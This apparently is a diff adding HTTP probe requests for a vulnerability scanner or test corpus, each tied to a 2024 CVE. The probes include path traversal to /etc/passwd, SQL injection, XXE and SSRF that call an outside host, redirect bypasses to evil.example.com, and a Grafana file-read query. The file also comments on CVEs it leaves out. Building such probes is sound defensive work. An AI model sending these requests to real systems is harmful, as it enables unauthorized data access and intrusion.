+GET /admin.php%3ftest.php
+GET /html/usr/share/doc/hostname/copyright%3f
+GET /tmp/temp.db%3f.1.1.1.1a-1.css
+GET /mnt/ram/var/log/httpd.log%3f.1.1.1.1a-1.css
+
+# --- CVE-2024-38816 / CVE-2024-38819 (Spring Framework WebMvc.fn/WebFlux.fn):
+#     static resource path traversal. ---
+GET /static/link/%2e%2e/etc/passwd
+GET /static/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+
+# --- CVE-2024-22243 / CVE-2024-22259 / CVE-2024-22262 (Spring Framework URI
+#     parsing): host-validation bypass through backslash userinfo and fragment
+#     confusion in attacker-supplied redirect URLs. ---
+GET /login?redirect=https://example.com%5c@evil.example.com
+GET /login?redirect=https://evil.example.com%23@example.com
+
+# --- CVE-2024-34351 (Next.js): SSRF through the image optimizer with an
+#     attacker-supplied url parameter. ---
+GET /_next/image?w=16&q=10&url=http://198.51.100.7/x
+
+# --- CVE-2024-4956 (Sonatype Nexus Repository 3): unauthenticated path
+#     traversal with many leading encoded slashes. ---
+GET /%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+
+# --- CVE-2024-45409 (GitLab / ruby-saml): forged SAMLResponse posted to the
+#     SAML callback; the attack smuggles a DigestValue into StatusDetail. ---
+POST /users/auth/saml/callback header="Content-Type: application/x-www-form-urlencoded" body="SAMLResponse=PHNhbWxwOlJlc3BvbnNlPg==&RelayState=poc"
+
+# --- CVE-2024-45387 (Apache Traffic Control Traffic Ops): SQL injection in
+#     the deliveryservice_request_comments PUT endpoint. ---
+PUT /api/4.0/deliveryservice_request_comments header="Content-Type: application/json" body="{\"xmlId\":\"1' OR 1=1--\",\"comment\":\"poc\"}"
+
+# --- CVE-2024-9264 (Grafana): post-auth DuckDB SQL expression reaching
+#     read_blob for local file read / command execution. ---
+POST /api/ds/query?ds_type=__expr__&expression=true header="Content-Type: application/json" body="{\"from\":\"1\",\"queries\":[{\"datasource\":{\"name\":\"Expression\",\"type\":\"__expr__\",\"uid\":\"__expr__\"},\"expression\":\"SELECT content FROM read_blob('/etc/passwd')\",\"refId\":\"B\",\"type\":\"sql\",\"window\":\"\"}],\"to\":\"2\"}"
+
+# --- CVE-2024-34102 (Adobe Commerce / Magento CosmicSting): unauthenticated
+#     XXE through nested deserialization in the shipping estimate endpoint. ---
+POST /rest/V1/guest-carts/1/estimate-shipping-methods header="Content-Type: application/json" body="{\"address\":{\"totalsCollector\":{\"collectorList\":{\"totalCollector\":{\"sourceData\":{\"data\":\"http://198.51.100.7/xxe.xml\",\"dataIsURL\":true,\"options\":12345678}}}}}}"
+
+# --- CVE-2024-36991 (Splunk Enterprise on Windows): path traversal in the
+#     messaging module's C: drive handling. ---
+GET /en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../Windows/win.ini
+
+# --- 2024 attack classes left out ---
+# CVE-2024-6387 (OpenSSH): SSH protocol, no HTTP request shape.
+# CVE-2024-37085 (VMware ESXi): requires ESXi joined to an AD domain and is
+#   triggered over LDAP, not HTTP.
+# CVE-2024-27982 / CVE-2024-22019 (Node.js): smuggling and chunk-extension
+#   DoS need connection-level framing that a single request line cannot carry.
+# CVE-2024-37890 (ws): WebSocket header-count DoS; connection state required.
+# CVE-2024-45519 (Zimbra): postjournal RCE is delivered over SMTP, not HTTP.
+# CVE-2024-47575 (FortiManager): FGFM protocol on port 541, not HTTP.
+# CVE-2024-2961 (glibc iconv): needs an application-level file include chain
+#   (php://filter iconv sequence); no stable request signature.
+# CVE-2024-27316 (httpd) and CVE-2024-34750 (Tomcat): HTTP/2 CONTINUATION and
+#   stream accounting DoS; the blackbox h2c client cannot express the framing.
+# CVE-2024-38821 (Spring Security WebFlux): advisory confirms statics auth
+#   bypass but no public request shape was published.
+# CVE-2024-46982 (Next.js): cache poisoning via a crafted request, but no
+#   public PoC documents the request shape; /_next/image SSRF probes cover
+#   CVE-2024-34351 only.
+# CVE-2024-1132, CVE-2024-3656, CVE-2024-8698, CVE-2024-8883 (Keycloak): the
+#   advisories describe redirect_uri traversal, low-privilege admin API use,
+#   and SAML signature confusion without publishing reproducible request
+#   shapes; no probes are shipped.
+# CVE-2024-9164 (GitLab): runs pipelines for arbitrary refs; no remote
+#   request signature beyond normal API traffic.
+# CVE-2024-9379 (Ivanti CSA): SQLi in the CSA console, but the vulnerable
+#   endpoint/parameter was not published; CVE-2024-8190/9380 cover the
+#   command-injection requests.
+# CVE-2024-29847 (Ivanti EPM): .NET remoting deserialization over the agent
+#   port; the exploit uses tcp:// framing, not HTTP.
+# CVE-2024-51378 (CyberPanel): secMiddleware bypass and reset-status command
+#   injection, but the public writeups do not pin the request that reaches it;
+#   CVE-2024-51567/51568 cover the documented endpoints.
+# CVE-2024-38472 / CVE-2024-40898 (httpd, Windows UNC SSRF): exploitation
+#   depends on Windows platform and backslash UNC handling in the target
+#   path; no stable request string was verified in this pass.
+# CVE-2024-38474 / CVE-2024-38476 / CVE-2024-38477 / CVE-2024-39573 /
+#   CVE-2024-39884 / CVE-2024-40725 (httpd): configuration-dependent rewrite
+#   or proxy behavior; the request looks like ordinary traffic unless a
+#   specific vhost configuration exists.
+# CVE-2024-6670 / CVE-2024-6671 (WhatsUp Gold, KEV): SQLi authentication
+#   bypass, but no public request shape was verified in this pass.
+# CVE-2024-25600 (Bricks) / CVE-2024-27956 (WP Automatic) / CVE-2024-28000
+#   (LiteSpeed Cache): WordPress plugin CVEs are out of scope by policy.
+# CVE-2024-27718 / CVE-2024-33724 / CVE-2024-25852 / CVE-2024-2620 /
+#   CVE-2024-4320 / CVE-2024-37888 / CVE-2024-32238: candidate CVEs could not
+#   be verified against a primary source with a concrete request shape.
+# CVE-2024-28397 (js2py): library sandbox escape with no request shape.
+# CVE-2024-28255 note: probes carry the path-parameter bypass; full SpEL
+#   exfiltration needs an attacker-controlled callback.
